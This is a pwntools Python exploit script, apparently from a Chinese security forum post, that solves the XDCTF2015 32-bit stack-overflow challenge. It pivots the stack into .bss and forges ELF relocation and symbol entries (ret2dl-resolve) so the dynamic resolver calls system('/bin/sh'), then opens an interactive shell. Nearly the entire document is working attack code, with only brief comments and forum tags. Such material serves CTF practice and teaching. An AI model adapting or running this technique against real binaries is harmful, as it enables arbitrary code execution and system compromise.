
```python
from pwn import *
stack_size = 0x834
bss_addr = 0
base_stage = 0
rop_size = 20
leave_ret_addr = 0x08049105
resolve_addr = 0x08049020
REL_header_addr = 0x08048380
SYM_header_addr = 0x0804820C
SYM_size = 16
STR_header_addr = 0x080482AC
read_plt = 0

def stack_trans(read_start_addr, new_esp):
    over_buffer = 'A' * 108
    overwrite_ebp = p32(new_esp)
    call_read = read_plt
    ret = leave_ret_addr
    arg_1 = p32(0)
    arg_2 = p32(read_start_addr)
    arg_3 = p32(0x100)
    payload = flat(over_buffer, overwrite_ebp, call_read, ret, arg_1, arg_2, arg_3)
    fill = 'B' * (0x100 - len(payload))
    payload += flat(fill)
    return payload

def verify_trans(esp, elf):
    rop_size = 24
    ebp = "DDDD"
    write_plt = elf.plt['write']
    jmp_write = p32(write_plt)
    gap = "EEEE"
    arg_1 = p32(1)
    arg_2 = p32(esp + rop_size)
    arg_3 = p32(len("/bin/sh\00"))
    bin_str = "/bin/sh\00"
    payload = flat(ebp, jmp_write, gap, arg_1, arg_2, arg_3, bin_str)
    return payload

def fake_Rel(r_offset, r_info):
    fake_Elf32_Rel = p32(r_offset)
    fake_Elf32_Rel += p32(r_info)
    return fake_Elf32_Rel
    pass

def fake_Sym(st_name, st_value, st_size, st_info, st_other, st_shndx):
    fake_Elf32_Sym = p32(st_name) # 也就这个st_name重要
    fake_Elf32_Sym += p32(st_value) # 其他的是选值，从IDA中抄就完事了
    fake_Elf32_Sym += p32(st_size)
    fake_Elf32_Sym += bytes([st_info]) + bytes([st_other]) + p16(st_shndx)
    return fake_Elf32_Sym

def write_rel():
    r_offset = 0x804C010
    r_info = 0x607
    rel = fake_Rel(r_offset, r_info)
    return rel

def write_sym():
    st_name = 0x080482EE - 0x080482AC
    st_value = 0
    st_size = 0
    st_info = 0x12
    st_other = 0
    st_shndx = 0
    sym = fake_Sym(st_name, st_value, st_size, st_info, st_other, st_shndx)
    return sym

def getshell_1(esp):
    rel = write_rel()
    sym = write_sym()
    ebp = "DDDD"
    jmp_resolve = p32(resolve_addr)
    fake_rel_address = esp + rop_size
    push_offset = p32(fake_rel_address - REL_header_addr)
    random_str = 'CCCC'
    arg_1 = p32(1)
    arg_2 = p32(esp + rop_size + 8 + 16 + 4)
    arg_3 = p32(8)

    rubbish = 'EEEE'
    bin_str = '/bin/sh\00'
    rop = flat(ebp, jmp_resolve, push_offset, random_str, arg_1, arg_2, arg_3)
    payload = rop + rel + sym + rubbish.encode() + bin_str.encode()
    return payload

def getshell(fake_Elf32_Rel, fake_Elf32_Sym, esp):
    ebp = "DDDD"
    jmp_resolve = p32(resolve_addr)
    fake_rel_address = esp + rop_size
    push_offset = p32(fake_rel_address - REL_header_addr)
    random_str = 'CCCC'
    bin_sh_address = p32(esp + rop_size + 8 + 16 + 8)

    system_str = 'system\x00\x00'
    bin_str = '/bin/sh\x00'
    rop = flat(ebp, jmp_resolve, push_offset, random_str, bin_sh_address)
    payload = rop + fake_Elf32_Rel + fake_Elf32_Sym + system_str.encode() + bin_str.encode()
    return payload

def cacl_stack_size(fake_sym_addr, elf_bss):
    if (fake_sym_addr - SYM_header_addr) % SYM_size == 0:
        return -1
    temp = ((fake_sym_addr - SYM_header_addr) // SYM_size) + 1
    fake_sym_addr = SYM_size * temp + SYM_header_addr
    base_stage = fake_sym_addr - 8
    return base_stage - elf_bss

if __name__ == '__main__':
    context(os='linux', arch='i386', log_level='debug')
    p = process("./main_8_3.out")
    elf = ELF("./main_8_3.out")

    bss_addr = elf.bss()
    base_stage = bss_addr + stack_size
    fake_sym_addr = base_stage - rop_size + rop_size + 8
    res = cacl_stack_size(fake_sym_addr, bss_addr)
    if res != -1:
        stack_size = res
        base_stage = bss_addr + stack_size
        read_plt = elf.plt['read']
        new_esp = base_stage - rop_size

        payload = stack_trans(base_stage - rop_size, new_esp)
        p.recvuntil("Welcome to XDCTF2015~!\n")
        p.send(payload)

        system_addr = new_esp + rop_size + 8 + 16

        r_offset = 0x804C010
        fake_sym_addr = new_esp + rop_size + 8
        r_info = (((fake_sym_addr - SYM_header_addr) // SYM_size) << 8) + 7
        fake_rel = fake_Rel(r_offset, r_info)

        st_name = system_addr - STR_header_addr
        st_value = 0
        st_size = 0
        st_info = 0x12
        st_other = 0
        st_shndx = 0
        fake_sym = fake_Sym(st_name, st_value, st_size, st_info, st_other, st_shndx)

        payload = getshell(fake_rel, fake_sym, new_esp)
        p.send(payload)
        p.interactive()
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

[#基础知识](https://bbs.kanxue.com/forum-171-1-180.htm)

[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)

[#溢出](https://bbs.kanxue.com/forum-171-1-182.htm)
